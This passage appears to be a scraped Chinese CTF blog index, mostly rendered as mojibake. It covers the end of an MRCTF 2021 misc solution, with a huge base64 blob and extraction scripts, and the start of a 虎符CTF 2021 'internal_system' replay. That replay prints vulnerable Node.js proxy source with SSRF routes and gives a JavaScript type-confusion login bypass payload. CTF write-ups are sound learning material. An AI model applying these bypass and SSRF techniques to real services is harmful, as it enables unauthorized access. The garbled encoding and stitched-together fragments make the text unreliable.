JXUmxwellrUldZVkpYVWtoWlZWVjRWMFpXY21KR1drNWliRXB2VjFaa05GUXhTbkpPVm1SaFVtNUNjRlZ0ZEhkVFZscDBaRWRHYTAxWFVrbFdiWFJ6VmxkS1NGVnVRbFpoYTFwTVZHMTRZV05zYTNwaFIyeE9WbXhaTUZacVNqQlpWbVJJVTJ4YVdHSkhhRmhaYkZKSFZERndWbGR1VG1wV2EzQjZXVEJrTkZVeVNsZFRiVVpZVmtWS2NsbHFSbUZTTVU1ellrWkthVll5YUZwV2JUQjRWVzFSZUZwR1pHRlNWR3h4VkZaYWQwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcDBWVmhrV0Zac2NFdGFWVnBYVjFkR1IyRkhiRmhTYTNCYVZtdGFZVmxYVVhoVWEyUllWMGQ0Y1ZWc2FGTlhSbEpZWkVoa1ZGWnNjRWxaTUZwUFZqRlpkMVpxVmxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVVsNVVtdGtWV0Y2Vms5WmJHUnFaVVphZEUxVVVtaE5iRVkwVmxab2IxWXhaRWhsUmxaWFRVZFNkbGt3V2xaa01WcFZVbXhvVTJKWVozZFdSbHBoVkRGa1IxTnVUbFJpUjJoWVZGZHdWMk5zV2tobFJYUnJVakZLUmxaSGVHOWhSVEZYWTBoc1YyRnJTbWhWTWpGU1pWWlNjbGR0YUZOaWEwcFFWbGN3TVZFd01YTlhia1pVWW01Q2MxVnRjekZUVmxaMFpFZEdhVkpyY0RCV1Z6QTFWMnhhUms1VlVsWk5WbkJ5Vm14YVQyTldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZsUmEzQllZVEZ3VUZaSGVGcGxiVVpIWTBaa2FFMVlRakpYV0hCSFZtMVdWMU5zYkdsU2JIQndWbXRrTkZkR1pGaGxSemxwVFZaS1NGWXlOVXRYUjBwV1YyNUdWVll6VW1oVmFrWmhVMGRXUjFSc1ZtbFNia0Y0Vmxaa2QxVXhXWGhYYWxwU1lXeEtWMWxYZEdGaFJtdDVZek5vVjAxWFVubFViRnByVlRKRmVsRnNjRmROVjFGM1dWUktTbVZXVm5WVWJHaFlVakZLV2xkWGVHOVZNVnBYVm01R1VtSlZXbFZWYlRFMFpWWlplVTVYZEdoU2JIQXdWbGQwYzFkc1dsaFVWRVpYWVd0d1RGWXhXa2RqYlVaSFkwZDRhRTB3U2xGV01uaFhZVEZSZUZOdVVsTmhNbEpUV1d0a1UyTkdXblJrU0dSWFlrWnNORmRyVWxOaFZURnlZa1JPVldKR2NISldNR1JMWXpGT2NrOVdXbWhOVm5CdlYxZHdSMVV4V1hoYVNGWlZZWHBzVkZsclpETk5WbHBJWlVaYVQxWXdXa2xWTW5SaFlXeEtXRlZzWkZWV00wSklXa2Q0WVdOV1RuSmtSbEpUWWtad05WWkVSbUZXTVZsNVUydHNVbUpVYkZoWlYzUkxZMnhhU0UxV1pHdFNhM0I1VjJ0a2IxVXlSalpXYm1SWFZucENNMVJzVlRGU01XUlpZVVphYUUxRVZtaFdiWEJEVmpBMVIxZHNhRTlXYXpWWFZGZDBkMlZXVW5OWGJrNVlZa2RTU2xWWGRHOVdNREZIWTBod1YwMUhVbFJWYlRGVFUwZE9TR0pHVG1sU00xRXhWbTE0YW1WSFZuSk9WbVJYVjBkU1QxWnRNVk5qVmxaeVZtMUdXRkpzY0hoV1J6QTFWbXhLZEdWR2FGZE5ibEl6V1d0YVMyTnJOVlZTYkdob1RWaENlVmRXV21GaE1VbDRWRzVPYVZKdFVuQldhMVpLVFVaYWMxa3phRmROVld3MFdUQldjMVl5U2taT1dFSldZa2RvUkZwRVJtRmtSMVpJVW0xMFRtRXhjRWxXYWtreFZURlNjMVJyYUdoU2JWSldWbTE0Vm1WR1dYZFhiSEJzVmpGYVNWUXhaRzlVYkZwWVQwaHNXRll6VW5GVWJGcGhWakZrZFZSc2FHaGhlbFpYVm0xNFlXUXlSa2RYV0dSaFVsUnNVRmxyV25kbGJHUnlWbFJHYUZKVVJscFZWbEpIVmpKS1dWRnJlRlZXVmxWNFZXcEdhMlJXVG5KT1ZtaFRZa2hDTWxac1VrTldNbEY0V2tWa2FWSnRhSEpWYWtKaFlqRldkRTVWVGxOTlZtdzFXa1ZTUTJGRk1WWmlSRTVWWWtaYWNsWnNaRXRTTWs1SlUyeGtVMDB5YUc5V2FrSnJWVzFXZEZSclpHRlNNbmhaVldwS2IxWnNXbk5oU0dSU1lsWmFTRlpIZEd0V1IwcElaVWM1Vm1GclNtaFdhMXBoWTFaT2RFOVdaR2xTTVVwYVYydFdhMDFIUmxaTldFcHBVa1pLV0Zsc1VsZFdSbHBJWlVkR1QySlZjRWxWYlhocllWWmFSbFpZWkZkaVZFVXdWbXBLVTFKck5WZGhSM1JUWWtad2RsZHNaREJaVm1SWFdrWm9hMUpyTlZaVVZscHpUVEZTVjJGRlpGZE5hMVkyV1ZWa1IxZHNXa1pYYWs1WFVsWndNMVZ0ZUd0ak1YQklaRVprVGxORlNrdFdiR040VGtaUmVGZFlaRTVXYkhCWlZqQm9RMWRHYkhOaFJ6bFhVbXhaTWxWdGREQmhNVXB6WTBSR1YxSXphRkJaVm1SR1pVZE9SMk5HYUZkTk1VcDVWbXhTUzFReFNYaFhibFpUWWtVMWIxUldhRU5sVmxwSFYyMTBWazFYVWtoV01uaHZZVEZLUmxOc1pGVldWa3BJVmpGYVlWZEhVa2hQVm1Sb1pXdFplRmRXVm05a01XUkhWMjVPYWxKWVVtaFdhazV2VTBac05sSnNaR3BOV0VKSldWVmtiMkpIU2tkaVJGWlhZbFJHTTFWcVJuTlhSa3BaWVVkR1UxWXlhRmxYVmxKTFlqRldWMWR1VW10VFIxSldWRlphZDJWc1dsaGtSMFpWWWtWd01GWlhlR0ZXYkZvMlVtdG9WMDF1YUdoWmVrcExVbFpXYzJGSGFFNVdia0Y1VmpGYVYxbFdUWGxVV0doVlltczFXVmxyWkZOalJscHlWbTFHVjFac2NEQmFSV1JIWVRBeFdGVnJiRmRpV0ZKNlZteGtTMU5HVm5WUmJGcG9ZVEZ3VFZaSE1UUlpWMDV6WVROd2FGSXllRTlXYlhoYVRVWmFjVk5xUWxwV2JWSkpWVzAxVDJGc1NuUmhSbWhhVmtWYWFGcFdXbmRXYkdSMVZHeGtWMkV6UWpaWFZFSnJUa1pWZVZOc1pGUmlWVnBaVm10V1MyRkdaRmRhUldSWFRWZFNXbGxyWkc5Vk1rcFlZVVp3V0ZZelVuSldWekZTWlVad1IxcEdhR2xoZWxaWlZrWmtlazFXVGtkWFdHeHNVbnBzYjFadGRITk9SbFY1VGxjNVYwMVZjREJXVm1oclYwWmFjMk5GZEdGV1ZuQllWakZrUjFJeVJraGlSbWhUWVROQmVsWnRlR3RrTVVWNVZWaG9ZVk5GTlhCVmJYaDNWMVpzVlZOc1RsaFNiRXBaV2tWYWExUXhTblJrUkU1WVlUSk5NVll3V2t0ak1rNUZVV3hrVjAweWFGRldNVnBoV1ZkTmVWUnJhR2hTYmtKUFdXMHhibVZzV2xoalJXUnJUVlUxU1ZVeWRHOWhWa3B5VGxac1ZtSkdXak5XVkVaaFpFVXhTVnBIZUZOV1JscEtWbGQ0YjJJeFdYaGFSV2hvVW0xNFdGUlZaRk5rYkZweFVtNU9hbUpJUWtsVU1XUjNZVlpLYzFkWWNGZE5ibEpvVmtSR2ExSXhUblZVYkZKcFVqSm9XbGRXVWtkVE1WcEhZa2hLV0dKVlduRlVWM014VTBac2NsZHNaRmROYTNCSVdUQm9jMVl5Um5KVGJXaFdaV3R3VUZwRldrOWpiRnB6Vm0xc1UwMVZjRE5XYlhCRFZqRk5lRmRzWkZoaWExcFZXVzAxUTJNeFZuUmpla1pVVm14YU1GcEZaRWRoVmtweVkwUkNWMVl6VFRGV01qRkxWbFpLZFZkc2NHaGhNWEJ2VjFSR1lWSXlVa2RUYms1aFVsUldiMXBYZUZwTmJGbDRWV3RPVjAxcmJEUldiR2h6VmtkRmVXRkdaRnBoTWxKMlZtMTRZV1JIVmtoU2F6Vk9WbTVDV2xkc1ZtdFNNa1p5VFZaa1dHSnRlRmhWYm5CSFpHeGFTR1ZIUmxoU01Va3lWVmQ0YTFZeFNsZGpSRXBZVjBoQ1NGWnRNVmRXTVU1ellrZHNVMDF0YUZaV1YzaFhaREZrUjFwR2FHeFNlbXhXV1d4YVlWTkdiRlZVYlhSWVVqQndlVlJzV205V01rcFpWVzFvVlZac2NISlpNbmhoVmxaS2RHRkdaR2hOTUVZMFZteGFZV0l5UlhoWFdHaFVZbXMxY1ZWdGVFdFdNVnB5Vm0xR2FGSnRkRFZaZWs1dlZqQXhXRlZ1YkZWaVJuQnlWbFJLUm1Wc1JuTmpSbVJwVmtWR05GZHJVa2RYYlZaSFdraEtZVkp0YUhCWlZFWjNWbXhrVjFWck9WWk5WbkJZVm0wMVUySkdTWGRYYms1YVlURndlbFJzV25kV2JVWklaRWRvVTJKSVFYZFdiR1F3WWpGYWNrMVdhR2hTUlRWWVZGVmFkMWxXY0ZobFJXUnFZbFZhU0ZkclpHOWhSVEIzVTJ4S1YySlVSak5WYWtaV1pWWldjMXBHWkdsaGVsWlVWMWQwYTFVeVRrZFhibEpyVTBkU1dGbHJXbk5PUm1SeVZXeE9hRlpVUm5sWmExSlRWMjFGZUdOSVNsaFdiSEJNV1hwR2EyTXhVbk5qUjJ4VFlraENkbFl4WkhkU01WVjRXa1ZvVm1FeVVtaFZiRkpYVkRGYWRHUklaRmhXYkhCNFZURm9iMVJzU1hkWGEyeFdUVzVTYUZaRVJtRlhSMVpJVW14a2FWSnVRWHBYVkVvMFdWZE9WMVJ1U210U00xSllXVlJHZDA1V1dYbGtSM1JUVFZaV05GVXllR3RoYkVwSFkwWm9XbUpIYUVSVk1GcHJWakZrZEdSR2FGTmhNMEkxVmpKMGEySXhWWGxTYWxwWFltMVNXRlp1Y0VKbFJsWllZek5vYWsxWFVscFpWVnB2WVZaSmVGTnRhRmRpV0VKRVZtcEJNVkl4WkhOaFJUbFhWa2Q0V2xaWE1IaFZNVTVYWTBaYVdtVnNXbGhaYkZaWFRrWlplV05GT1ZkTlJFWklXVEJvZDFZd01VaFZiRkpXWWxSR1ZGVXdaRTlUUjBwSFZHMXNVMDB4UlhoV2JURTBZVzFSZVZacldrNVdWMUpaVmpCa1UxUXhXblJOVms1cVZteGFlVlp0TVVkWFJrcDBaVWh3V2xaWFRURldNRnBMWkVkV1IyRkdaRTVpYXpCNFZteFNTMU14U25KT1ZteHFVbTVDVDFWdE5VTmxWbHAwWTBWa1ZFMVdjREJXUjNScllWWktkRlZzYkZaTlJscE1WVEZhWVdOc1ZuSmFSbWhwVm14d1NWZFVRbGRqTVZsNVUydGFUMWRGU2xkWmExcExWMFp3UlZKdFJtdFNNVnBKVlcweE1GUnRSWGhqUld4WFlXdHJlRlpVUmxOak1YQkdZa1pLYUdWdGVGbFhWM2h2VkcxV1IxZFlaRmhpU0VKelZteFNWMWRHV2toTlZ6bFZZa1p3V1ZRd2FITlhSbGw2Vlc1R1ZXSkdjR2hXYWtaclpGWlNjMkZIYkdsaE1IQllWakZrTUZsWFVYbFdiazVZWW14S1QxWnNaRk5XUm14eVYydDBiR0pIVW5sWGEyaFBWakF4V0ZWclpGWk5ibEYzVm1wQmVGWXlUa2RoUm1Sb1lURndXRmRzVm1GaE1rMTVVbXRrVm1KWGVGUlVWRXB2VFd4YWMxVnJUbGROYkVZMFYydFdhMkZXVGtaalJteGFZbFJHVkZac1dsZGtSVFZXVkd4T1RsWnRkekZYYTFaVFVUSkdSazFXV21sU1JUVldXV3RhWVdOc1duTmFSWFJUVFdzMVNsVXllR3RWTURCNVlVYzVWMkZyU25KV1Z6RlhaRVpTY2xwSFJsTk5ibWhhVmxkd1MySXhXbk5YYms1b1UwZFNVMWxzV21GVFJscElaRWQwVjFZd2NFbGFWV2hEVm0xS1dWUllhRnBoYTFwVVZqQmtWMUp0VWtkYVIyeFRUVlZ3WVZacldtRmlNbEY0Vlc1T1dHSnJOWEZWYlRGdldWWnNWVk50T1ZaU2JIQjRWVEowTUZZeVNraFZibkJhVmxad00xbFZWWGhYVmtaWlkwWmtVMkpHY0c5WGExSkhXVmRTUjFOdVNtaFNNMUpVV1d0YWQyUnNaSE5hUkVKYVZtMVNXRmRyV2xkVmJVcFZZa2hHVlZac2NIcFVWRVpUVmpKR1JscEdXazVoTVZreFYxWldhMUl4V1hsU2JrcFBWMFp3WVZac1duZGxWbkJYVmxob1YyRjZiRmhXUjNocllVVXdkMU5VU2xkTlZuQllXVlJLU21WR1ZuVlViVVpUVm01Q1ZsZFhkRmRrTVdSSFlraE9hRkpyTlhGWmExcExaVlpaZVU1Vk9WaFNhM0I2VlRKd1IxWXhXWHBoUm1oYVZsWldORlpxU2s5U01rcEhZVVprVGsxVmNEVldiWGhUVWpGc1YxTllhRmRpYXpWWVdXdGFTMk5HV25KYVJGSnJUVlp3U0ZZeU1VZGhNREZ6VjJ4b1YwMXVhSFpaVkVaTFVteE9jMXBHVmxkV2EzQkpWbXBDWVdNeVRuTldiazVWWWtkU1QxWnNZelJsVmxwMFRWUlNVazFYVW5wV01qVlBZV3hLV1dGSFJsVldNMEpJVmxWYVYyTldUbkphUms1T1ZqRkpkMWRYZEdGVU1WSjBVMnhvYUZKWFVsaFpiRkpIVFRGV2NWSnVUbGhTYTNCYVdWVmtSMVV4V1hsaFJteFlWbXhLVEZaVVJtRmpNa3BKVTJ4a1YxSldjSGRXUmxwdlVURmtWMk5GV21GU1YxSllWVzE0ZDJWc2EzZGhSemxYWVhwR01WVlhlRk5XTWtaeVVtcFNWMkZyV21oWk1WcGhZekZrZEdKR1RrNWlWMUV5Vm0weE5HRnRWa2RVV0d4VlltdHdVRlp0TVZOaFJsWjBUbFZPYWxKc1dqQmFSV2hyVmtaYWMyTkVRbUZTVjFKSVZqQmtTMVl4WkhOaVJtUnBWMFpLTWxkV1VrZFRiVlp6VW01V1VtSkdjSEJXYTFwaFVsWmFkR05GWkZwV2JWSkhWRlphVjFadFNsaGhSVGxYWWxoU01scEVSbUZYUjFaSVQxZDBUbFpzYjNkV1ZFb3dZakpLUjFOdVVtaFNiV2hoVm10V1lXRkdjRmRYYm1SWFlrZFNNVlpITVhkV01rVjZVV3BhV0ZaRlNuSlVhMXBXWlZaT2MxcEdVbWxXVm5CYVZtMTBWMU15VG5OaVNFWlRZbFZhVkZSV1ZURmxiR3h5VjJ0MGFGWnJiRFJWTW5oM1ZqSktWVkpVUWxabGExcFVWV3BHYTJNeFduTlViV2hzWWxob1ZsWnJXbUZaVjFGM1RWWmtWMkpzU25OVmJGSnpZakZhZEUxV1RsUlNiRlkxVkd4b1QxWXdNWEpqUmxwV1lrWktSRlp0TVZkamJVNUhZVVp3YkdFelFrMVdWM0JIWVRKU1IxTnVUbFppUlRWWVZXMTRkbVZXV25STlNHUnNVbFJXU1ZaV2FITldNa3BJVlcwNVZWWkZjRlJXTVZwelpFVXhWMVJzYUZOaVJYQmFWMnRXYjJFeFdrZFhiazVxVWxkNFlWUlZXbmRWUmxweFVteHdhMDFXY0hoV2JYaHJWakF3ZVdGR1JsZE5WbkJvVjFaa1RtVldVbkpoUjJoVFltdEtVRmRYTUhoaWJWWnpWMnhvYWxKWFVuSlVWbFV4VTFaVmVXUkhPV2hXYTNCNVZHeGFjMVp0U2tkWGFrNVhWa1ZhYUZwRlZYaFRWbkJJWlVaT1YxSnNjRXRXYkdRMFlqSkplRmRZYUdGU1YyaHZWV3BLYjFZeGJISmFSazVYVW14d2VGVnROVTloYlVwSVZXcEdXR0V4Y0hKV1IzaGFaVzFHUjFwR1pGZFNWemgzVm10U1MxSXlUbkpOVm1SaFVqTkNWRlZzVm5kaU1WcDBaVWRHV0dKV1JqUlphMmhMV1ZaS1dWVnNVbFZXTTAxNFZXMTRWMWRIVmtkYVJtUk9WbTVDTlZkVVFtRmpNVmw1VTJ4c1VtRXdOV2hXYkZwM1ZFWmFjVkpyT1d0V2JFb3dWVzE0VDJGWFJYZGpSRTVYVFZkT05GUlZXazVsUmxaeldrWm9hV0pGY0ZCV1ZFSnJZakZhVjFWc1pHRlNhelZaVlcxNGQwMUdVbk5YYlhSWVVtdHNNMWt3Vm5OV01WbzJVVlJHVjAxdWFHaFZiWGhyWTFaU2MyTkhhR2hOV0VKMlZtMXdRMVp0VmtkWGJHUlhZbXhLYjFWc1VsZGlNWEJZWlVaa1RrMVdjREJVVldodlZHeEpkMVpxVWxwaE1YQnlWbXRhYTFOSFZraFBWbHBwWW10S05sWnRNVFJaVjA1elYyNUthMUpzV2xSWmEyaERWMnhrYzFadGRGTk5hMXA1VkZaYWIyRXhTa2RqUjBaWFlrWndWMVJXV21GV1ZrNXlaRVpvVjAxR2NFbFhWRUpoWVRKR1JrMVdiRkpoYTNCWlZtcE9RMVJHVm5GVGF6VnNVbXhLTVZaSE1XOVZNREYwWVVaYVYxWXphRmhhUkVaclVqRndSMkZIZUZObGJYaFhWMWQ0WVZsV1RrZFhXR3hyVW0xU1YxUlhkSGRXTVZsNVRsVmtWMVpzY0RCV1YzaFRXVlpaZW1GSWJHRlNSVm96Vld4YVYyUkhSa2RhUjJoT1RVVlpNRlp0ZUdGWlYwbDVVbGhvWVZKWGFGVlpWRXBUVjFac2RHUklaRmROVjNoWldrVmtSMkZHU25Sa1JGWmFaV3MxZGxacVFYaFhSbFp4VVd4d2FFMVlRbEZXYkZKTFVtMVdjMUp1VWxCV2JWSlBWbTAxUTFaV1dsaGpSWFJXWWxaYVdGWlhOVmRXVjBwSVlVWnNWbUZyV2t4WmFrWmhWMGRXU0U5V1drNWhlbFpaVjFkMGIxUXhXWGhYYTFwWVlrWktWbFp0ZUhkVFJsSnlWMnh3YkZaVVJsWlZWekZ2VlRKS1NWRllaRmRpUjFGM1dYcEdhMU5HU25WVGF6bFhVbFJXV1ZkV1pEQmtNVTVIWVROc2JGSlViSEpWYWtKaFUwWnJkMXBFVW1oU1ZFWmFWVmR3VjFZeVNsbFJhMUpZVm14d1YxcFdXbE5rVmxKMFkwWk9WMDF0YUZaV01XUXdWbXN4V0ZSclpGaGliRXB5VlRCa1UxZEdiSEpYYms1UFVtMVNlVlpYZEU5WFIwcEhZa1JTVm1KWVFsQldiR1JMVWpKT1NWTnNaRTVTTVVwTlYxaHdSMVF5VG5KUFZtUmhVakpvVDFadE5VTlViRnB4VW0xR1dsWnRlRmxXVjNSdlZqSkZlR05IYUZaaVJrcDZWbXRhYzJOdFJrWlRiWFJPVmpGS05sWnRNSGhTTWtaR1RWWmthbEp0ZUZkVVZ6VlRZVVpzV0dWRmRGaFNNVnBKVlcxNFYxWXhTbFZXYTFaWVlrWndhRlpxUmtwbFJrNXpWbTFzVTJFeGNGaFdiWFJUVVdzMVVsQlVNRDA9aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa æŠŠæœ€åçš„ a ç»™å»æ‰ï¼Œç„¶åä¸åœè§£ base64ã€‚ è²Œä¼¼å¥—äº†22å±‚ base64ï¼Œå°±ç¦»è°±ã€‚ MRCTF{bUt_Y0u_c@n_f1yyyyyyyy~} BTW, å®˜æ–¹ WP è¿™ä¸ªç§»ä½åŠ ç½®ä½çš„æ–¹å¼å†™èµ·æ¥æŒºæ–¹ä¾¿çš„ã€‚ for i in range(400): for j in range(50): ch = 0 for k in range(8): if judge(pim[i,j*8+k]) == 1: ch |= 1 &lt;&lt; k flag += chr(ch) flag = flag.strip('a') å¦å¤–æ¥æŠ„ä¸€ä¸‹ snowywar å¸ˆå‚…æ±‚ç©ºé—´å¹³é¢æ–¹ç¨‹çš„è§£æ³•ã€‚ import numpy as np mark = [(153, 15, 120),(51, 104, 132),(229, 38, 115)] def define_area(point1, point2, point3): point1 = np.asarray(point1) point2 = np.asarray(point2) point3 = np.asarray(point3) AB = np.asmatrix(point2 - point1) AC = np.asmatrix(point3 - point1) N = np.cross(AB, AC) # å‘é‡å‰ä¹˜ï¼Œæ±‚æ³•å‘é‡ # Ax+By+Cz Ax = N[0, 0] By = N[0, 1] Cz = N[0, 2] D = -(Ax * point1[0] + By * point1[1] + Cz * point1[2]) return -Ax, -By, -Cz, -D res = \"\" a,b,c,d = define_area((153, 15, 120),(51, 104, 132),(229, 38, 115)) print(a,b,c,d) äºæ˜¯å¯ä»¥å¾—åˆ°ç©ºé—´å¹³é¢æ–¹ç¨‹ Ax+By+Cz+D=0 çš„ç³»æ•°ã€‚ å°ç»“å¤ªé¡¶äº†å¤ªé¡¶äº†ï¼ åŒ—é‚®çš„å¸ˆå‚…ä»¬å¤ªå¼ºäº† Orzã€‚ BTWï¼Œå¸ˆå‚…ä»¬è‡ªå·±å¼€å‘çš„è¿™ä¸ª CTFm å¹³å°è¿˜ä¸é”™ï¼Œåªæ˜¯å¯èƒ½è¿˜æ¯”è¾ƒæ–°çš„åŸå› è¿˜æœ‰ç‚¹å° bugï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œæ…¢æ…¢æ¥å˜›ã€‚ æ¯”å¦‚ profile é¡µé¢è¿™é‡Œçš„åå­—è²Œä¼¼åªæ˜¯å‰ç«¯åšäº†é™åˆ¶ï¼Œåç«¯å¹¶æ²¡æœ‰é™åˆ¶æ¥ç€ï¼ˆè™½ç„¶å›¾ç‰‡ä¸Šæ²¡æœ‰ä½“ç° ï¼ˆæ¯”èµ›çš„æ—¶å€™å°±åšäº†ä¸¤é¢˜ + é—®å· check outï¼Œç„¶å rk45ï¼Œå°±ç¦»è°± å™¢ï¼Œå®˜æ–¹ WriteUp ä¹Ÿå‡ºæ¥äº†ï¼ˆ MRCTF Misc å®˜æ–¹WriteUp MRCTF2021 Reverseå®˜æ–¹wp MRCTF2021 CRYPTOå®˜æ–¹wp MRCTF2021 å®˜æ–¹ETH&amp;IOTæ–¹å‘Wp MRCTF2021 å®˜æ–¹PWNæ–¹å‘Wp ï¼ˆæ€ä¹ˆ web è¿˜æ²¡æœ‰å‘¢ ç»ˆäºæœ‰äº† MRCTF2021 Webæ–¹å‘Wp å°±è¿™æ ·å§ã€‚ç´¯æ­»äº†ã€‚ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/04/15/CTF_2021MRCTF/"},{"title":"CTF | 2021 è™ç¬¦CTF Web internal_system å¤ç°","text":"å¼•è¨€å‰å‡ å¤©æ‰“äº†ä¸ª 2021 æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“ï¼Œæˆ–è€…è¯´æ˜¯ è™ç¬¦ CTFã€‚ å†™äº†å‡ é“ Web çš„ Writeup ä¸¢åœ¨ä¸‹é¢è¿™é‡Œäº†ã€‚ CTF | 2021 æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“ WriteUp Web ä¸­è¿˜æœ‰ä¸€é“é›¶è§£çš„é¢˜ç›®ï¼Œå³ internal_systemã€‚ æ­£å¥½çœ‹åˆ°èµµæ€»çš„ buuoj å¼€äº†ç¯å¢ƒï¼Œè¶ç€è¿˜æœ‰å…´è¶£ï¼Œå°±æ¥å¤ç°ä¸€ä¸‹å§ã€‚ ç¯å¢ƒï¼š [è™ç¬¦CTF 2021] Internal System å¤ç°è¿‡ç¨‹ä¸»è¦å‚è€ƒäº† glzjin å¸ˆå‚…çš„ è™ç¬¦ CTF2021 Web é›¶è§£é¢˜ Internal System WriteUp é¢˜ç›®æè¿° å¼€å‘äº†ä¸€ä¸ªå…¬å¸å†…éƒ¨çš„è¯·æ±‚ä»£ç†ç½‘ç«™ï¼Œå¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œä½†æ¥ä¸åŠäº†è¿˜æ˜¯å…ˆä¸Šçº¿å§ï¼ˆâ”€.â”€||ï¼‰ http://8.140.152.226:47921/ hint: /sourceå­˜åœ¨æºç æ³„éœ²ï¼›/proxyå­˜åœ¨ssrf StepsStep 01 ç™»å½• JS å¼±ç±»å‹ç»•è¿‡è®¿é—® /source å¾—åˆ°æºç ï¼Œå•Šæ˜¯ NodeJSã€‚ const express = require('express') const router = express.Router() const axios = require('axios') const isIp = require('is-ip') const IP = require('ip') const UrlParse = require('url-parse') const {sha256, hint} = require('./utils') const salt = 'nooooooooodejssssssssss8_issssss_beeeeest' const adminHash = sha256(sha256(salt + 'admin') + sha256(salt + 'admin')) const port = process.env.PORT || 3000 function formatResopnse(response) { if(typeof(response) !== typeof('')) { return JSON.stringify(response) } else { return response } } function SSRF_WAF(url) { const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, '') return isIp(host) &amp;&amp; IP.isPublic(host) } function FLAG_WAF(url) { const pathname = new UrlParse(url).pathname return !pathname.startsWith('/flag') } function OTHER_WAF(url) { return true; } const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF] router.get('/', (req, res, next) =&gt; { if(req.session.admin === undefined || req.session.admin === null) { res.redirect('/login') } else { res.redirect('/index') } }) router.get('/login', (req, res, next) =&gt; { const {username, password} = req.query; if(!username || !password || username === password || username.length === password.length || username === 'admin') { res.render('login') } else { const hash = sha256(sha256(salt + username) + sha256(salt + password)) req.session.admin = hash === adminHash res.redirect('/index') } }) router.get('/index', (req, res, next) =&gt; { if(req.session.admin === undefined || req.session.admin === null) { res.redirect('/login') } else { res.render('index', {admin: req.session.admin}) } }) router.get('/proxy', async(req, res, next) =&gt; { if(!req.session.admin) { return res.redirect('/index') } const url = decodeURI(req.query.url); console.log(url) const status = WAF_LISTS.map((waf)=&gt;waf(url)).reduce((a,b)=&gt;a&amp;&amp;b) if(!status) { res.render('base', {title: 'WAF', content: \"Here is the waf...\"}) } else { try { const response = await axios.get(`http://127.0.0.1:${port}/search?url=${url}`) res.render('base', response.data) } catch(error) { res.render('base', error.message) } } }) router.post('/proxy', async(req, res, next) =&gt; { if(!req.session.admin) { return res.redirect('/index') } // test url // not implemented here const url = \"https://postman-echo.com/post\" await axios.post(`http://127.0.0.1:${port}/search?url=${url}`) res.render('base', \"Something needs to be implemented\") }) router.all('/search', async (req, res, next) =&gt; { if(!/127\\.0\\.0\\.1/.test(req.ip)){ return res.send({title: 'Error', content: 'You can only use proxy to aceess here!'}) } const result = {title: 'Search Success', content: ''} const method = req.method.toLowerCase() const url = decodeURI(req.query.url) const data = req.body try { if(method == 'get') { const response = await axios.get(url) result.content = formatResopnse(response.data) } else if(method == 'post') { const response = await axios.post(url, data) result.content = formatResopnse(response.data) } else { result.title = 'Error' result.content = 'Unsupported Method' } } catch(error) { result.title = 'Error' result.content = error.message } return res.json(result) }) router.get('/source', (req, res, next)=&gt;{ res.sendFile( __dirname + \"/\" + \"route.js\"); }) router.get('/flag', (req, res, next) =&gt; { if(!/127\\.0\\.0\\.1/.test(req.ip)){ return res.send({title: 'Error', content: 'No Flag For You!'}) } return res.json({hint: hint}) }) module.exports = router é¦–å…ˆéœ€è¦ç™»å½•ï¼Œè¿™é‡Œç”¨åˆ°äº† JavaScript å¼±ç±»å‹çš„ç‰¹æ€§ã€‚ å‚è€ƒ SuSeC CTF 2020 Writeup &amp; åŸºäºNode.JSçš„sha1ç»•è¿‡åˆ†æ ä»¥åŠ Node.jsä¸­url.parseå‡½æ•°çš„æ½œåœ¨å®‰å…¨é—®é¢˜ JavaScript åœ¨ä½¿ç”¨åŠ å·æ‹¼æ¥çš„æ—¶å€™æœ€ç»ˆä¼šå¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²(string)ï¼Œäºæ˜¯ä¸ä¼šå½±å“ sha256 çš„å¤„ç†ã€‚ è¿™é‡Œæ˜¯ç”¨ GET query ä¼ å‚ï¼Œå¯ä»¥æ„é€  payload username[]=admin&amp;password=admin 